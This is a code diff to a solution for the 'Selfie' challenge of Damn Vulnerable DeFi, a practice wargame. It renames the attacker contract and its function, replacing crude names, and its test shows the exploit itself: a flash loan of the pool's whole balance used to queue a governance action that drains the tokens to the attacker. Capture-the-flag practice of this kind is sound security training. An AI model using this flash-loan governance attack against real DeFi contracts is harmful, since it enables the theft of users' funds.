@@ -10,7 +10,7 @@ import {DamnValuableTokenSnapshot} from "../../../Contracts/DamnValuableTokenSna
 import {SimpleGovernance} from "../../../Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../Contracts/selfie/SelfiePool.sol";
 
-contract Penetrator {
+contract Exploit {
     SimpleGovernance private gov;
     SelfiePool private pool;
     DamnValuableTokenSnapshot private dvts;
@@ -24,7 +24,7 @@ contract Penetrator {
         gov = _pool.governance();
     }
 
-    function ebi() external {
+    function run() external {
         uint256 poolBalance = dvts.balanceOf(address(pool));
         pool.flashLoan(poolBalance);
         dvts.approve(owner, poolBalance);
@@ -81,12 +81,12 @@ contract Selfie is DSTest {
     function testExploit() public {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
-        Penetrator penis = new Penetrator(selfiePool, dvtSnapshot);
-        penis.ebi();
+        Exploit expl = new Exploit(selfiePool, dvtSnapshot);
+        expl.run();
         vm.warp(block.timestamp + 2 days);
-        simpleGovernance.executeAction(penis.actionId());
-        uint256 totalAmount = dvtSnapshot.balanceOf(address(penis));
-        dvtSnapshot.transferFrom(address(penis), attacker, totalAmount);
+        simpleGovernance.executeAction(expl.actionId());
+        uint256 totalAmount = dvtSnapshot.balanceOf(address(expl));
+        dvtSnapshot.transferFrom(address(expl), attacker, totalAmount);
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
